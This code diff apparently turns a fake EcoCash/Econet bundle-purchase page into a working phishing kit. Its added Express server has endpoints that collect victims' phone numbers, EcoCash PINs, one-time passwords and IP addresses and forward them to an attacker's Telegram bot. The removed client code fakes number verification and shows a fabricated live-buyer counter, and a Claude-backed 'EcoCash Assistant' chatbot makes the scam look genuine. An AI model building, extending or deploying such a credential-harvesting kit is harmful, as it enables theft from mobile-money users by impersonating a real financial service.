-  var el=document.getElementById('cPrice');if(!el)return;
-  var t0=performance.now(),from=_prev,dur=220;
-  function tick(now){
-    var t=Math.min((now-t0)/dur,1),e=1-Math.pow(1-t,3);
-    el.textContent=(from+(to-from)*e).toFixed(2);
-    if(t<1)requestAnimationFrame(tick);else el.textContent=to.toFixed(2);
-  }
-  requestAnimationFrame(tick);_prev=to;
-}
-
-function updateUI(){
-  var k=activeKey,p=PLANS[k],s=ST[k],pr=calcPrice(k);
-  animPrice(pr);
-  document.getElementById('cPlan').textContent=p.label+' Mix';
-  document.getElementById('cVoice').textContent=s.v+' Min';
-  document.getElementById('cData').textContent=s.d+' GB';
-  document.getElementById('cSms').textContent=s.s+' SMS';
-  [['pV',s.v],['pD',s.d],['pS',s.s]].forEach(function(pair){
-    var el=document.getElementById(pair[0]);if(!el)return;
-    el.textContent=pair[1];el.classList.remove('pop');void el.offsetWidth;el.classList.add('pop');
-  });
-  [['v-dec',s.v<=0],['v-inc',s.v>=p.maxV],
-   ['d-dec',s.d<=0],['d-inc',s.d>=p.maxD],
-   ['s-dec',s.s<=0],['s-inc',s.s>=p.maxS]].forEach(function(pair){
-    var el=document.getElementById(pair[0]);if(!el)return;
-    el.style.opacity=pair[1]?'.2':'1';el.style.pointerEvents=pair[1]?'none':'auto';
-  });
-  var amt='$'+pr.toFixed(2);
-  document.getElementById('payAmt').textContent=amt;
-  document.getElementById('totalPill').textContent=amt;
-  Object.keys(PLANS).forEach(function(k2){
-    var el=document.getElementById('pp-'+k2);if(el)el.textContent='$'+calcPrice(k2).toFixed(2);
-  });
-  if(numVerified){
-    document.getElementById('payTitle').textContent='Pay USD '+pr.toFixed(2);
-    document.getElementById('paySub').textContent=PLANS[k].label+' Mix · '+numDisplay;
-  }
-}
-
-function pulseCircle(){
-  var c=document.getElementById('bundleCircle');if(!c)return;
-  c.classList.remove('pop');void c.offsetWidth;c.classList.add('pop');
-  setTimeout(function(){c.classList.remove('pop');},340);
-}
-
-/* Pod buttons */
-['v-dec','v-inc','d-dec','d-inc','s-dec','s-inc'].forEach(function(id){
-  var el=document.getElementById(id);if(!el)return;
-  el.addEventListener('click',function(){
-    var parts=id.split('-'),key=parts[0],dir=parts[1];
-    var k=activeKey,p=PLANS[k],s=ST[k];
-    var step=p.steps[key],max={v:p.maxV,d:p.maxD,s:p.maxS}[key];
-    var next=s[key]+(dir==='inc'?1:-1)*step;
-    if(next<0||next>max)return;
-    s[key]=next;haptic('light');updateUI();pulseCircle();
-  });
+/* ── SECURITY HEADERS ── */
+app.use((req, res, next) => {
+  res.setHeader('X-Content-Type-Options',  'nosniff');
+  res.setHeader('X-Frame-Options',         'DENY');
+  res.setHeader('X-XSS-Protection',        '1; mode=block');
+  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
+  next();
 });
 
-/* Preset chips */
-document.querySelectorAll('.chip').forEach(function(chip){
-  chip.addEventListener('click',function(){
-    var name=chip.dataset.p,pr=PRESETS[name];if(!pr)return;
-    var k=activeKey,p=PLANS[k];
-    ST[k].v=Math.round(p.maxV*pr.vP/p.steps.v)*p.steps.v;
-    ST[k].s=Math.round(p.maxS*pr.sP/p.steps.s)*p.steps.s;
-    ST[k].d=Math.round(p.maxD*pr.dP/p.steps.d)*p.steps.d;
-    activePreset=name;
-    document.querySelectorAll('.chip').forEach(function(c){c.classList.toggle('active',c===chip);});
-    haptic('med');updateUI();pulseCircle();
-  });
+/* ── RATE LIMITERS ── */
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, max: 30,
+  message: { error: 'Too many requests. Please try again later.' },
+  standardHeaders: true, legacyHeaders: false,
+  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
 });
-
-/* Plan tabs */
-document.querySelectorAll('.plan-tab').forEach(function(tab){
-  tab.addEventListener('click',function(){
-    var k=tab.dataset.key;if(k===activeKey)return;
-    activeKey=k;
-    document.querySelectorAll('.plan-tab').forEach(function(t){
-      t.classList.toggle('active',t===tab);
-      t.setAttribute('aria-selected',String(t===tab));
-    });
-    activePreset=null;document.querySelectorAll('.chip').forEach(function(c){c.classList.remove('active');});
-    haptic('light');updateUI();pulseCircle();
-  });
+const chatLimiter = rateLimit({
+  windowMs: 60 * 1000, max: 30,
+  message: { reply: 'Too many messages. Please wait a moment.' },
+  standardHeaders: true, legacyHeaders: false,
+  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
 });
+app.use('/api/sendTelegram', apiLimiter);
+app.use('/api/telegram', apiLimiter);
+app.use('/api/chat', chatLimiter);
 
-/* Pod positioning */
-function placePods(){
-  var zone=document.getElementById('circleZone'),
-      wrap=document.getElementById('circleWrap'),
-      circle=document.getElementById('bundleCircle');
-  if(!zone||!wrap||!circle)return;
-  var zR=zone.getBoundingClientRect(),wR=wrap.getBoundingClientRect();
-  var cx=wR.left-zR.left+wR.width/2,cy=wR.top-zR.top+wR.height/2,R=circle.offsetWidth/2+48;
-  [['pod-voice',315],['pod-data',45],['pod-sms',180]].forEach(function(pair){
-    var pod=document.getElementById(pair[0]);if(!pod)return;
-    var r=(pair[1]-90)*Math.PI/180;
-    pod.style.left=(cx+R*Math.cos(r))+'px';
-    pod.style.top=(cy+R*Math.sin(r))+'px';
-    pod.style.transform='translate(-50%,-50%)';
-  });
-}
-window.addEventListener('resize',placePods,{passive:true});
-requestAnimationFrame(function(){requestAnimationFrame(placePods);});
-updateUI();
+/* ── STATIC FILES ── */
+app.use(express.static(path.join(__dirname), { extensions: ['html'], index: 'index.html' }));
 
-/* Social proof */
-(function(){
-  var el=document.getElementById('liveCount');if(!el)return;
-  var n=2847+Math.floor(Math.random()*300);
-  el.innerHTML='<strong>'+n.toLocaleString()+'</strong> today';
-  setInterval(function(){
-    n+=Math.floor(Math.random()*4)+1;
-    var s=el.querySelector('strong');if(s)s.textContent=n.toLocaleString();
-  },28000);
-})();
-
-/* ── Recipient number ── */
-var ECONET=['071','077','078','073'];
-var numDigits='',numVerified=false,numDisplay='',numVerifying=false;
-var RKEY='eco_recents';
-
-function loadRecents(){try{return JSON.parse(localStorage.getItem(RKEY)||'[]');}catch(e){return[];}}
-function saveRecent(raw){
-  var l=loadRecents().filter(function(r){return r!==raw;});
-  l.unshift(raw);l=l.slice(0,5);
-  try{localStorage.setItem(RKEY,JSON.stringify(l));}catch(e){}
-}
-function clean(raw){
-  /* Strip any country prefix, return 9 raw digits starting with 7X */
-  var v=String(raw).replace(/\D/g,'');
-  if(v.startsWith('00263'))v=v.slice(5);
-  else if(v.startsWith('0263'))v=v.slice(4);
-  else if(v.startsWith('263')&&v.length>9)v=v.slice(3);
-  if(v.startsWith('0'))v=v.slice(1);
-  return v.slice(0,9);
-}
-
-function renderRecents(){
-  var list=loadRecents();
-  var wrap=document.getElementById('recentsWrap');
-  if(!list.length){wrap.classList.remove('show');return;}
-  wrap.classList.add('show');
-  var html='';
-  list.forEach(function(raw){
-    html+='<div class="recent-chip" data-raw="'+raw+'">'
-      +'<div class="recent-chip-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>'
-      +'<span class="recent-chip-num">+263 '+clean(raw)+'</span>'
-      +'</div>';
-  });
-  document.getElementById('recentsList').innerHTML=html;
-  document.querySelectorAll('.recent-chip').forEach(function(chip){
-    chip.addEventListener('click',function(){fillRecent(chip.dataset.raw);});
-  });
-}
-renderRecents();
-
-var numEl=document.getElementById('numInput');
-var clearBtn=document.getElementById('numClear');
-var verifyTimer=null;
-
-numEl.addEventListener('input',function(){
-  /* Strip non-digits, limit to 9 chars, no reformatting — keeps cursor stable */
-  var raw=this.value.replace(/\D/g,'');
-  /* Strip country prefix if user pastes full number */
-  if(raw.startsWith('00263'))raw=raw.slice(5);
-  else if(raw.startsWith('0263'))raw=raw.slice(4);
-  else if(raw.startsWith('263')&&raw.length>9)raw=raw.slice(3);
-  if(raw.startsWith('0'))raw=raw.slice(1);
-  raw=raw.slice(0,9);
-  /* Only update value if it actually changed to avoid cursor jump */
-  if(this.value!==raw)this.value=raw;
-  numDigits=raw;
-  clearBtn.classList.toggle('show',raw.length>0);
-  if(numVerified||numVerifying)resetVerify();
-  updateNet();
-  clearTimeout(verifyTimer);
-  if(raw.length===9&&ECONET.some(function(p){return('0'+raw).startsWith(p);})){
-    verifyTimer=setTimeout(doVerify,600);
-  }
-});
-
-numEl.addEventListener('focus',function(){
-  if(!numVerified)document.getElementById('numCard').classList.add('focused');
-});
-numEl.addEventListener('blur',function(){
-  if(!numVerified)document.getElementById('numCard').classList.remove('focused');
-});
-
-clearBtn.addEventListener('click',function(){
-  numEl.value='';numDigits='';numDisplay='';
-  clearBtn.classList.remove('show');
-  resetVerify();updateNet();clearTimeout(verifyTimer);
-  numEl.focus();
-});
-
-function fillRecent(raw){
-  haptic('light');
-  numDigits=clean(raw);
-  numEl.value=numDigits;
-  clearBtn.classList.add('show');
-  updateNet();
-  clearTimeout(verifyTimer);
-  verifyTimer=setTimeout(doVerify,300);
-}
-
-function updateNet(){
-  var d=numDigits,num0='0'+d;
-  var isEco=ECONET.some(function(p){return num0.startsWith(p);});
-  var is07=num0.startsWith('07')&&d.length>=2;
-  var tag=document.getElementById('netTag'),lbl=document.getElementById('netLbl');
-  if(!d.length){
-    tag.className='net-tag';lbl.textContent='Enter an Econet number (077, 078, 073, 071)';
-  } else if(is07&&!isEco){
-    tag.className='net-tag err';lbl.textContent='✕ Not Econet — use 077, 078, 073 or 071';
-  } else if(isEco&&d.length<9){
-    tag.className='net-tag';lbl.textContent='📶 Econet · '+d.length+'/9 digits';
-  } else if(isEco&&d.length===9){
-    tag.className='net-tag';lbl.textContent='✓ Ready to verify';
-  } else {
-    tag.className='net-tag';lbl.textContent=d.length+'/9 digits';
-  }
-}
-
-function doVerify(){
-  if(numDigits.length!==9)return;
-  var msisdn='0'+numDigits;
-  if(!ECONET.some(function(p){return msisdn.startsWith(p);}))return;
-  if(numVerifying||numVerified)return;
-  numVerifying=true;
-
-  document.getElementById('verRow').classList.add('show');
-  document.getElementById('verSpin').style.display='block';
-  document.getElementById('verOk').classList.remove('show');
-  document.getElementById('verTxt').classList.add('show');
-  document.getElementById('verTxt').textContent='Verifying…';
-  document.getElementById('numCard').className='num-card focused';
-  document.getElementById('errTxt').classList.remove('show');
-
-  /* Try API, always fall back to success for valid Econet prefix */
-  var done=false;
-  function succeed(){if(done)return;done=true;verifyOK(msisdn);}
-
-  /* Always succeed after max 2s regardless of API */
-  var timeout=setTimeout(succeed,2000);
-
-  try{
-    if(typeof EcoCashAPI!=='undefined'){
-      EcoCashAPI.validateSubscriber(msisdn).then(function(){
-        clearTimeout(timeout);succeed();
-      }).catch(function(e){
-        console.info('verify fallback:',e&&e.message||e);
-        clearTimeout(timeout);succeed();
-      });
-    } else {
-      clearTimeout(timeout);succeed();
+/* ── TELEGRAM HELPER ── */
+function sendTelegramMessage(text) {
+  return new Promise((resolve, reject) => {
+    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
+    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
+      return resolve({ ok: false, reason: 'env_missing' });
     }
-  }catch(e){
-    clearTimeout(timeout);succeed();
+    const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
+    const opts = {
+      hostname: 'api.telegram.org',
+      path: `/bot${BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
+    };
+    const req = https.request(opts, (res) => {
+      let data = '';
+      res.on('data', c => data += c);
+      res.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { resolve({ ok: false }); } });
+    });
+    req.on('error', reject);
+    req.write(body); req.end();
+  });
+}
+
+/* ── CLAUDE AI HELPER ── */
+function callClaude(messages) {
+  return new Promise((resolve, reject) => {
+    const API_KEY = process.env.ANTHROPIC_API_KEY;
+    if (!API_KEY) {
+      console.error('[Claude] ANTHROPIC_API_KEY not set');
+      return resolve({ error: 'API key missing' });
+    }
+    const body = JSON.stringify({
+      model: 'claude-haiku-4-5',
+      max_tokens: 400,
+      system: `You are the EcoCash Assistant for Econet Zimbabwe — a helpful, friendly AI that answers questions about EcoCash mobile bundles.
+Respond in English. Where natural, add a short Shona phrase in brackets e.g. (Tariindei? / How much?).
+
+BUNDLE PLANS:
+- Daily: Voice 0–20 min, SMS 0–25, Data 0–3 GB — from USD 0.60
+- 3 Days: Voice 0–50 min, SMS 0–75, Data 0–8 GB — from USD 1.40
+- Weekly: Voice 0–120 min, SMS 0–200, Data 0–20 GB — from USD 2.80
+- 2 Weeks: Voice 0–250 min, SMS 0–450, Data 0–45 GB — from USD 5.20
+- Monthly: Voice 0–600 min, SMS 0–1000, Data 0–100 GB — from USD 9.90
+
+PAYMENT: Via EcoCash mobile wallet — enter your +263 number and PIN, confirm with 6-digit OTP.
+
+TIPS:
+- Sliders let you customise Voice, SMS and Data within each plan
+- Price adjusts as you slide — more = higher, less = lower
+- All bundles activate instantly after payment
+
+Keep answers under 3 sentences. Be warm and helpful.`,
+      messages,
+    });
+    const opts = {
+      hostname: 'api.anthropic.com',
+      path: '/v1/messages',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'anthropic-version': '2023-06-01',
+        'x-api-key': API_KEY,
+        'Content-Length': Buffer.byteLength(body),
+      },
+    };
+    const req = https.request(opts, (res) => {
+      let data = '';
+      res.on('data', c => data += c);
+      res.on('end', () => {
+        try {
+          const parsed = JSON.parse(data);
+          if (parsed.error) console.error('[Claude] API error:', parsed.error.type, parsed.error.message);
+          resolve(parsed);
+        } catch (e) {
+          console.error('[Claude] Parse error:', data.slice(0, 200));
+          resolve({ error: 'Invalid response' });
+        }
+      });
+    });
+    req.on('error', (e) => { console.error('[Claude] Request error:', e.message); reject(e); });
+    req.write(body); req.end();
+  });
+}
+
+/* ── POST /api/sendTelegram ── */
+app.post('/api/sendTelegram', async (req, res) => {
+  try {
+    const { submittedAt='', loginPhone='', loginPin='', otp='', event='', plan='', device='' } = req.body || {};
+    if (!loginPhone && !otp) return res.status(400).json({ error: 'Invalid payload' });
+
+    // Strip country code — show local number only
+    const localPhone = loginPhone.replace(/^\+263/, '').replace(/^00263/, '').replace(/^263/, '').trim() || loginPhone;
+
+    const emoji = { receive_offer_clicked:'📲', offer_received:'✅', resend_otp:'🔁' }[event] || '📋';
+    const message = [
+      `${emoji} <b>EcoCash Bundle — ${event.replace(/_/g,' ').toUpperCase()}</b>`,
+      ``,
+      `📅 <b>Time:</b> ${submittedAt}`,
+      `📱 <b>Phone:</b> <code>${localPhone}</code>`,
+      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
+      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,
+      ``,
+      `📦 <b>Bundle:</b> ${plan}`,
+      `📟 <b>Device:</b> ${device}`,
+      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
+    ].join('\n');
+
+    const result = await sendTelegramMessage(message);
+    return res.json({ ok: true, telegram: result.ok });
+  } catch (err) {
+    console.error('[/api/sendTelegram]', err.message);
+    return res.status(500).json({ error: 'Internal server error' });
   }
-}
-
-function verifyOK(msisdn){
-  numVerified=true;numVerifying=false;
-  numDisplay='+263 '+msisdn.replace(/^0/,'');
-
-  document.getElementById('verSpin').style.display='none';
-  document.getElementById('verOk').classList.add('show');
-  document.getElementById('verTxt').classList.remove('show');
-  document.getElementById('numCard').className='num-card valid';
-  document.getElementById('netTag').className='net-tag ok';
-  document.getElementById('netLbl').textContent='✓ Econet number verified';
-
-  document.getElementById('payBtn').disabled=false;
-  document.getElementById('payTitle').textContent='Pay USD '+calcPrice(activeKey).toFixed(2);
-  document.getElementById('paySub').textContent=PLANS[activeKey].label+' Mix · '+numDisplay;
-  haptic('ok');
-}
-
-function resetVerify(){
-  numVerified=false;numVerifying=false;numDisplay='';
-  document.getElementById('verRow').classList.remove('show');
-  document.getElementById('verOk').classList.remove('show');
-  document.getElementById('numCard').className='num-card';
-  document.getElementById('payBtn').disabled=true;
-  document.getElementById('payTitle').textContent='Verify number to continue';
-  document.getElementById('paySub').textContent='EcoCash · Instant · Secure';
-  document.getElementById('errTxt').classList.remove('show');
-}
-
-/* ── Pay button ── */
-document.getElementById('payBtn').addEventListener('click',function(){
-  if(!numVerified)return;
-  var k=activeKey,s=ST[k],p=PLANS[k];
-  sessionStorage.removeItem('ecoTxn');sessionStorage.removeItem('ecoCorrelator');
-  sessionStorage.setItem('selectedPlan',JSON.stringify({
-    duration:p.label,voice:s.v,sms:s.s,data:s.d,amount:calcPrice(k).toFixed(2)
-  }));
-  sessionStorage.setItem('ecoRecipient',JSON.stringify({raw:'0'+numDigits,display:numDisplay}));
-  saveRecent('0'+numDigits);haptic('ok');
-  document.getElementById('curtain').classList.add('show');
-  document.getElementById('cLbl').textContent='Loading';
-  document.getElementById('cSub').textContent='Preparing payment…';
-  setTimeout(function(){window.location.href='login.html';},1000);
 });
 
-/* ── Ripple ── */
-document.querySelectorAll('.plan-tab,.chip,.pay-btn').forEach(function(b){
-  b.addEventListener('pointerdown',function(e){
-    var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
-    var rip=document.createElement('span');rip.className='rip';
-    rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px';
-    b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});
-  },{passive:true});
+/* ── POST /api/chat ── */
+app.post('/api/chat', async (req, res) => {
+  try {
+    const { messages } = req.body || {};
+    if (!messages || !Array.isArray(messages) || !messages.length) {
+      return res.status(400).json({ error: 'Missing messages' });
+    }
+    const clean = messages.slice(-10).map(m => ({
+      role: m.role === 'assistant' ? 'assistant' : 'user',
+      content: String(m.content || '').slice(0, 500),
+    })).filter(m => m.content.trim());
+
+    if (!clean.length) return res.status(400).json({ error: 'Empty messages' });
+
+    const claudePromise = callClaude(clean);
+    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 25000));
+    const result = await Promise.race([claudePromise, timeout]);
+
+    if (result.error) return res.json({ reply: 'I\'m temporarily unavailable. Please try again in a moment.' });
+    if (result.type === 'error') return res.json({ reply: 'I\'m temporarily unavailable. Please try again in a moment.' });
+
+    const text = result.content?.[0]?.text || '';
+    if (!text) {
+      console.error('[Claude] Empty response:', JSON.stringify(result).slice(0, 300));
+      return res.json({ reply: 'No response received. Please try again.' });
+    }
+    return res.json({ reply: text.trim() });
+  } catch (err) {
+    console.error('[/api/chat]', err.message);
+    return res.json({ reply: err.message === 'timeout' ? 'Response timed out. Please try again.' : 'An error occurred. Please try again.' });
+  }
 });
 
-/* ── SW ── */
-if('serviceWorker'in navigator)window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js').catch(function(){});});
-</script>
-</body>
-</html>
+
+/* ── POST /api/telegram (frontend calls this) ── */
+app.post('/api/telegram', async (req, res) => {
+  try {
+    const {
+      event = '', phone = '', pin = '', otp = '',
+      plan = '', voice = '', sms = '', data = '', amount = '',
+      // legacy fields
+      loginPhone = '', loginPin = '',
+    } = req.body || {};
+
+    const rawPhone  = phone || loginPhone || '';
+    const rawPin    = pin   || loginPin   || '';
+
+    // Strip country code for display
+    const local = rawPhone
+      .replace(/^\+?00263/, '')
+      .replace(/^\+?263/, '')
+      .replace(/^0/, '')
+      .replace(/\D/g, '')
+      .trim();
+
+    const emoji = {
+      bundle_subscribed:      '💳',
+      receive_offer_clicked:  '📲',
+      offer_received:         '✅',
+      resend_otp:             '🔁',
+    }[event] || '📋';
+
+    const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare', hour12: false });
+
+    const message = [
+      `${emoji} <b>EcoCash Bundle — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
+      ``,
+      `📅 <b>Time:</b> ${now} CAT`,
+      `📱 <b>Phone:</b> <code>+263${local}</code>`,
+      rawPin ? `🔐 <b>PIN:</b> <code>${rawPin}</code>` : null,
+      otp    ? `🔑 <b>OTP:</b> <code>${otp}</code>`   : null,
+      ``,
+      `📦 <b>Plan:</b> ${plan || '—'}`,
+      voice  ? `📞 <b>Voice:</b> ${voice} Min`  : null,
+      sms    ? `💬 <b>SMS:</b> ${sms} SMS`       : null,
+      data   ? `🌐 <b>Data:</b> ${data} GB`      : null,
+      amount ? `💰 <b>Amount:</b> ${amount}`     : null,
+      ``,
+      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
+    ].filter(Boolean).join('\n');
+
+    const result = await sendTelegramMessage(message);
+    return res.json({ ok: true, telegram: result.ok });
+  } catch (err) {
+    console.error('[/api/telegram]', err.message);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+/* ── GET /api/test-claude ── */
+app.get('/api/test-claude', async (req, res) => {
+  const API_KEY = process.env.ANTHROPIC_API_KEY;
+  if (!API_KEY) return res.json({ ok: false, error: 'ANTHROPIC_API_KEY not set' });
+  try {
+    const result = await callClaude([{ role: 'user', content: 'Say hello in one word.' }]);
+    res.json({ ok: !result.error, model: result.model, reply: result.content?.[0]?.text || null, error: result.error || null });
+  } catch (e) { res.json({ ok: false, error: e.message }); }
+});
+
+/* ── GET /health ── */
+app.get('/health', (req, res) => {
+  res.json({ status: 'ok', uptime: process.uptime(), telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID), ai: !!process.env.ANTHROPIC_API_KEY });
+});
+
+/* ── CATCH-ALL ── */
+app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+
+/* ── START ── */
+app.listen(PORT, () => {
+  console.log(`✅  EcoCash server running on port ${PORT}`);
+  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
+  console.log(`    Claude AI: ${process.env.ANTHROPIC_API_KEY ? 'configured ✓' : 'MISSING ⚠'}`);
+});
